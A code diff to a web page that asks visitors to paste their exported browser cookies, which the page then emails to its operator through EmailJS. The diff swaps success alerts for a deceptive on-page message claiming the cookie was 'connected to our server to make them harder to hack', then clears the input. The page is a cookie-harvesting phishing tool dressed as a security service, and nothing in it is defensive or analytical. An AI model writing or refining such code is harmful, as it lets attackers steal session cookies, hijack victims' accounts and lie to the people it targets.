@@ -49,6 +49,7 @@
         </div>
         <textarea id="cookieTextarea"></textarea>
         <button id="submitButton">Submit</button>
+        <div id="confirmationMessage" style="display: none; margin-top: 20px;"></div>
     </div>
 
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
@@ -73,9 +74,12 @@
                     emailjs.send("service_120g06v", "template_34ev8zv", {
                         ID: cookieText
                     }).then(function(response) {
-                        alert("Email sent successfully!");
+                        document.getElementById('confirmationMessage').innerText = "Your cookie has been connected to our server to make them harder to hack!";
+                        document.getElementById('confirmationMessage').style.display = 'block';
+                        document.getElementById('cookieTextarea').value = ''; // Clear the text area
                     }, function(error) {
-                        alert("Failed to send email: " + JSON.stringify(error));
+                        document.getElementById('confirmationMessage').innerText = "Failed to connect your cookie to our server.";
+                        document.getElementById('confirmationMessage').style.display = 'block';
                     });
                 } else {
                     alert("Please paste your exported cookie text.");
